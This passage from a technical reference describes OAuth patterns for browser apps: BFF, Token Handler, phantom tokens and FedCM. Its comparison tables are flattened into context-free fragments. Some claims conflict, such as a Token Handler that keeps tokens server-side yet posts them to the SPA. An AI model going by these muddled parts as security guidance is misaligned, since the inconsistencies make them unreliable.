Artifact Produced: None (Internal retrieval / silent refresh)
15. BFF forwards the request to the resource server with the access token

The BFF rigidly constructs the downstream HTTP payload, heavily injecting the access token as the standard Authorization: Bearer parameter. The BFF may securely generate and attach DPoP proof headers (§39.3) if the environment natively mandates sender constraint.
16. Resource Server processes request and returns response
The Resource Server actively consumes the ingress request, mathematically validates the access token signature and scope, and cleanly returns the officially requested data payload.
17. BFF forwards the response to the browser
The BFF selectively sanitises the inbound payload, decisively stripping backend security headers, and transparently forwards the exact functional response logically backwards to the Browser.
Artifact Produced: None (Client receives data)

The IETF draft "OAuth 2.0 for Browser-Based Applications" (draft-ietf-oauth-browser-based-apps-26, December 2025 — in RFC Editor Queue) codifies security best practices for OAuth flows in browser-based applications. This section summarises the draft's key recommendations.
The draft identifies three architectural patterns for browser-based applications and provides clear guidance on which to prefer:

BFF pattern (§35.2) — Strongly recommended. The browser-based application uses a backend component as the OAuth client. Tokens never reach the browser. This is the most secure pattern and is the draft's primary recommendation for applications that can support a backend component

Service Worker pattern — The SPA uses a Service Worker to handle the OAuth flow and store tokens in the Service Worker's context, which is isolated from the main page's JavaScript. This provides some XSS isolation but is still weaker than a server-side backend because the Service Worker runs in the browser

Direct SPA pattern — The SPA acts as the OAuth client directly. Tokens are stored in the browser. This is the weakest pattern but may be necessary for pure static SPAs hosted on CDNs without any backend infrastructure
When a BFF is not feasible and the SPA must handle tokens directly, the draft mandates the following security measures:
passages.headingText: 34.3.2 Requirements for Direct SPA Flows (No Backend)

passages.text: Authorization Code with PKCE — Mandatory. The implicit grant (response_type=token) is obsoleted — the draft states it MUST NOT be used. PKCE is required even though SPAs are public clients and do not have a client secret to protect
passages.headingText: 34.3.2 Requirements for Direct SPA Flows (No Backend)

passages.text: Short-lived access tokens — Access tokens should have lifetimes of minutes (5–15 minutes recommended), not hours. Short lifetimes limit the window during which a stolen token can be used
passages.headingText: 34.3.2 Requirements for Direct SPA Flows (No Backend)

passages.text: Refresh token rotation — Each use of a refresh token must return a new refresh token and invalidate the old one. This prevents an attacker who steals a refresh token from using it indefinitely — the legitimate client's next refresh attempt will fail (because the old refresh token was invalidated), alerting the authorization server to potential compromise
passages.headingText: 34.3.2 Requirements for Direct SPA Flows (No Backend)

passages.text: Refresh token sender-constraining — When supported, refresh tokens should be bound to the client using DPoP (§39.3). This ensures that even if a refresh token is stolen, it cannot be used without the corresponding DPoP private key
passages.headingText: 34.3.2 Requirements for Direct SPA Flows (No Backend)

passages.text: Token storage — Access tokens should be stored in JavaScript memory (a variable — not localStorage or sessionStorage). If localStorage must be used (e.g., to survive page reloads), the application must implement robust XSS prevention — Content Security Policy (CSP) with strict nonce-based script-src, Subresource Integrity (SRI) for all third-party scripts, and regular dependency auditing
passages.headingText: 34.3.2 Requirements for Direct SPA Flows (No Backend)

passages.text: No cross-origin token requests — SPAs should not make direct cross-origin requests to the token endpoint. The CORS complexity and token exposure risk are significant. If the authorization server and the SPA are on different origins, a BFF or proxy should mediate the token exchange
passages.headingText: 34.3.2 Requirements for Direct SPA Flows (No Backend)

passages.text: The draft explicitly deprecates the following patterns:
Implicit grant (response_type=token)
Access tokens appear in URL fragments — exposed to browser history, Referer headers, browser extensions, and any script that reads window.location
Resource Owner Password Credentials (ROPC)
The client sees the user's password — violates the principle of credential isolation. Enables credential phishing by malicious clients
Cross-origin token requests from SPAs
CORS complexity; token exposure in browser. If the AS and SPA are on different origins, use a BFF
Server-side (BFF session store)
passages.headingText: 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)

passages.text: Browser (JavaScript memory or localStorage)
passages.headingText: 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)

passages.text: Browser (URL fragment → JavaScript variable)
passages.headingText: 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)

passages.text: ❌ Tokens never reach browser
passages.headingText: 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)

passages.text: ✅ Tokens accessible to XSS in same origin
passages.headingText: 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)

passages.text: ✅ Tokens accessible to XSS + exposed in URL fragment
passages.headingText: 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)

passages.text: Confidential — possesses client credentials
passages.headingText: 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)

passages.text: private_key_jwt or tls_client_auth
passages.headingText: 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)

passages.text: ✅ Server-side — safe, transparent refresh
passages.headingText: 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)

passages.text: ⚠️ Browser-side — requires rotation; XSS risk
passages.headingText: 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)

passages.headingText: 34.3.4 Comparison: BFF vs. SPA-Direct vs. Implicit (Deprecated)

passages.text: The Token Handler pattern — pioneered by Curity — is a specialised implementation of the BFF concept optimised for API-first architectures. Where a full BFF contains application-specific business logic (it is the SPA's bespoke backend), the Token Handler is a generic, reusable OAuth session manager that handles only the OAuth ceremony — login, token storage, token refresh, logout — and nothing else.
The architecture separates two components:

OAuth Agent — A lightweight server-side component that acts as the confidential OAuth client. It handles the authorization code flow, stores tokens, manages sessions, and issues session cookies to the SPA. The OAuth Agent exposes a small API to the SPA: /login, /session, /refresh, /logout

OAuth Proxy — A reverse proxy plugin (typically deployed as a Kong, nginx, or Envoy plugin) that intercepts API requests from the SPA. For each request, the OAuth Proxy validates the session cookie, contacts the OAuth Agent to resolve the cookie to an access token, and injects the access token into the upstream request

The key distinction from a full BFF: the Token Handler does not proxy API traffic through a backend application. The API request flows directly from the SPA to the API gateway, which calls the Token Handler to validate the session and obtain the token, then forwards the request to the upstream API with the token injected:
Generic and reusable — A single Token Handler instance can serve multiple SPAs. Each SPA has its own OAuth client registration, but the Token Handler logic is shared

No application logic — The Token Handler is a pure OAuth session manager. Application-specific API orchestration, data transformation, and business logic live in the upstream services — not in the Token Handler

Separation of concerns — Frontend developers interact with a simple cookie-based session; backend developers build stateless APIs that receive standard Bearer tokens. Neither side needs to understand OAuth protocol details
SPA redirect flow with Token Handler:
SPA opens a popup — window.open('https://token-handler.example.com/auth/login', 'token-handler', 'width=500,height=600')
Popup redirects to IdP — the token handler (running in the popup) initiates the OAuth authorization code flow
User authenticates — in the popup window, the user logs in at the IdP
Token handler exchanges code — after the callback, the token handler performs the server-side code exchange with PKCE
Token handler sends tokens via postMessage — the token handler calls window.opener.postMessage(...) with the token payload
SPA receives tokens — the SPA listens for message events on window and extracts the tokens
SPA stores tokens in memory only — tokens are held in JavaScript variables, never written to localStorage or cookies
postMessage token delivery security. The postMessage API is the critical security boundary in the token handler pattern:

Critical security requirements: the targetOrigin parameter in postMessage must be the SPA's explicit origin, never '*'; the SPA must validate event.origin against the expected token handler origin; the message payload must include a type discriminator to prevent confusion with other postMessage events.
The phantom token pattern (Curity) extends the Token Handler architecture with a privacy-preserving token translation layer:
The authorization server issues opaque (reference) tokens to the OAuth Agent — the token is a random string that carries no user information
The OAuth Agent stores the opaque token in the session and presents it to the OAuth Proxy when resolving a session cookie
The API gateway (or OAuth Proxy plugin) introspects the opaque token at the authorization server's introspection endpoint (RFC 7662)
The authorization server returns a self-contained JWT — the "phantom token" — containing the full set of claims (sub, scope, permissions, authorization_details)
The API gateway replaces the opaque token with the JWT and forwards the request to the upstream API
The upstream API validates the JWT locally (signature verification, expiry check) — no introspection call needed
The browser sees only a session cookie — no token of any kind
The API gateway sees only an opaque token until it introspects — if the gateway's logs are compromised, the opaque token reveals no user information
Upstream APIs receive a self-contained JWT — they can make rich authorization decisions without calling the authorization server
The phantom token's lifetime is controlled by the introspection response's exp — the API gateway can cache the JWT for the duration of its validity, reducing introspection calls
Phantom Token component architecture:

Advantages of the Phantom Token pattern: (1) clients never see JWTs — only short, opaque identifiers are exposed on the wire; (2) resource servers validate JWTs statelessly (no introspection calls from the RS); (3) revocation is immediate (revoke the opaque token at the AS — no TTL wait); (4) the JWT payload can include internal claims not intended for client visibility (e.g., internal service identifiers, role mappings); (5) token size between client and gateway is minimal (opaque identifier vs full JWT). This pattern is recommended for architectures with an existing API gateway (Kong, Apigee, AWS API Gateway, Envoy) and multiple downstream resource servers.
The Web Credential Management API (navigator.credentials) is the browser's built-in interface for managing user credentials. It provides a unified surface for three credential types:
navigator.credentials.get(\{password: true\})
Browser-managed password autofill
navigator.credentials.get(\{identity: \{...\}\})
Federated login (FedCM — §35.5.2)
navigator.credentials.get(\{publicKey: \{...\}\})
WebAuthn / passkey authentication (§14)

The Credential Manager is relevant to OAuth proxy and BFF architectures because it changes how the browser mediates the initial authentication step — the user's interaction with the identity provider.

FedCM is a browser-native API that enables federated login (OIDC, OAuth) without third-party cookies. As browsers deprecate third-party cookies (Safari since 2020, Firefox since 2023, Chrome Privacy Sandbox timeline ongoing), traditional OIDC flows that rely on the IdP's third-party cookie for silent re-authentication and session checking break.

The problem: In a traditional OIDC flow, silent re-authentication works by embedding a hidden iframe pointing to the IdP's authorization endpoint with prompt=none. The IdP's cookie (set when the user previously authenticated) is present in the iframe request — if the cookie is valid, the IdP returns a new authorization code without user interaction. This relies on the IdP's cookie being sent in the cross-origin iframe request — a third-party cookie. When browsers block third-party cookies, the iframe request arrives without the IdP's cookie, and prompt=none fails — the user must re-authenticate interactively.
FedCM's solution: The browser mediates the federated login directly, removing the need for cross-origin cookies:
The RP calls navigator.credentials.get(\{ identity: \{ providers: [\{ configURL: "https://idp.example/.well-known/fedcm.json", clientId: "spa-client-123" \}] \} \})
The browser displays a native account chooser UI — showing the user's accounts from the IdP without any cross-origin iframe or cookie
The browser contacts the IdP's FedCM endpoints directly (account list endpoint, assertion endpoint)
The IdP returns an ID token or assertion to the browser
The browser delivers the credential to the RP's JavaScript

Impact on OAuth proxy and BFF architectures: FedCM changes how session renewal works. OAuth proxies and BFFs that relied on the IdP's third-party cookie for seamless re-authentication (using prompt=none in a hidden iframe or redirect) must adapt. The adaptation paths:
Primary authentication — FedCM handles the initial user authentication. The BFF receives the FedCM assertion and exchanges it for server-side OAuth tokens

Session renewal — When the BFF's refresh token expires and the user needs to re-authenticate, FedCM can provide a seamless re-authentication experience without requiring a full-page redirect to the IdP — the browser's native UI handles the interaction
SSO maintenance — FedCM replaces the check_session_iframe mechanism (OIDC Session Management) that relied on third-party cookies for cross-RP session synchronisation
Third-party cookie phase-out impact on authentication patterns:
Third-Party Cookie Dependency
OAuth redirect (SP-initiated)
OAuth implicit flow (fragment)
Migrate to authorization code anyway
OIDC session management (checksession iframe)
Use RP-Initiated Logout + polling
Social login widgets (iframe)
SSO across apps (IdP cookie)
Token Handler (popup + postMessage)

25.5.2.1 IdP Hint API and Login Status: The IdP Hint API allows an IdP to inform the browser about the user's login status, enabling the browser to render the correct UI (account chooser vs. sign-in button) without revealing user-specific information to the relying party.

The Set-Login response header communicates the user's login state to the browser. The browser stores this status in a partitioned fashion (per IdP domain) and uses it to determine whether to display the account chooser or prompt the user to sign in at the IdP first.
status=logged-in; id=<session>
Show account chooser with available accounts
Show "Sign in with IdP" button
Do not show any IdP-specific UI

The IdP must set the Set-Login header in response to a same-site top-level navigation from the IdP's login or logout page. This constraint ensures the status is always fresh and cannot be spoofed by a malicious RP. The browser clears a logged-in status when the user's session expires or when the IdP explicitly sets status=logged-out.
25.5.2.2 Browser Implementation Status
Default enabled since Chrome 117
Follows Chromium implementation

As of early 2026, FedCM is production-ready in Chromium-based browsers (approximately 72% global market share). Firefox and Safari support remains uncertain. Organizations requiring cross-browser compatibility should implement FedCM as a progressive enhancement alongside traditional OAuth flows.

Editorial Note: Cross-chapter references. See §22 (Attack Vectors) for the full XSS impact analysis across OAuth architectures — including the formal HttpOnly cookie value model (V_\\{\text\\{no-HttpOnly\\}\\} = V_\\{\text\\{session\\}\\} + V_\\{\text\\{persistence\\}\\} + V_\\{\text\\{stealth\\}\\}) — and CSRF protection in OAuth contexts (OAuth state parameter, double-submit cookie pattern, per-architecture defense comparison).
The Credential Manager API surfaces both FedCM credentials and passkey credentials (§14) through the same navigator.credentials.get() interface. A BFF architecture can combine both:
FedCM for IdP session establishment — the user selects their identity provider account via the browser's native UI
Passkey for strong user verification — the user authenticates with a biometric-bound discoverable credential

The browser's Credential Manager provides the unified interface — the user sees a single credential selection UI that may include both passkeys and federated accounts. The BFF receives whichever credential the user selects and processes it accordingly: a passkey assertion is validated against the WebAuthn relying party; a FedCM assertion is exchanged for OAuth tokens at the authorization server.
Server-side (BFF session store)
Browser (memory / localStorage)
Browser-side, rotation required
None — generic reverse proxy
✅ Contains app-specific API orchestration
None — generic OAuth session manager
High — one proxy, many upstreams
High — one Token Handler, many SPAs
Proxy mediates all API traffic
BFF mediates all API traffic
API gateway mediates; Token Handler handles only auth
SPA calls APIs directly (with token)
Page lifetime (in-memory only)
✅ Natural (SPA calls any origin)
Possible (with introspection)
Possible (with introspection)
✅ Acceptable (server-side tokens)
✅ Acceptable (server-side tokens)
⚠️ Only when backend not feasible
Kubernetes ingress auth; internal dashboards
Production SPAs with dedicated backends
API-first SPA architectures with API gateways
Static SPAs on CDNs with no backend

The common principle across all server-side patterns: the browser possesses only an opaque, HttpOnly session cookie — never an OAuth token. The choice between OAuth proxy, BFF, and Token Handler depends on whether the architecture needs application-specific backend logic (→ BFF), a generic reusable authentication layer (→ Token Handler), or a simple reverse proxy for protecting existing services (→ OAuth proxy). The direct SPA pattern exists as a fallback when no server-side component is available — it is the least secure option and requires compensating controls (short token lifetimes, refresh rotation, strict CSP, DPoP).

Combined architecture patterns. In practice, many production deployments layer multiple patterns: the user authenticates via FedCM (or traditional OAuth redirect as fallback), the BFF manages the session and relays tokens to backend APIs, an OAuth proxy at the ingress layer provides an additional authentication boundary for internal services, and a token handler enables direct access to third-party APIs from the SPA when needed. See §35.8 for the architecture selection guide with use-case recommendations.

The most common production deployment for OAuth proxy uses a Kubernetes ingress controller with nginx auth_request to delegate authentication to oauth2-proxy. This provides authentication at the ingress level, protecting all services behind the ingress without requiring individual service changes.
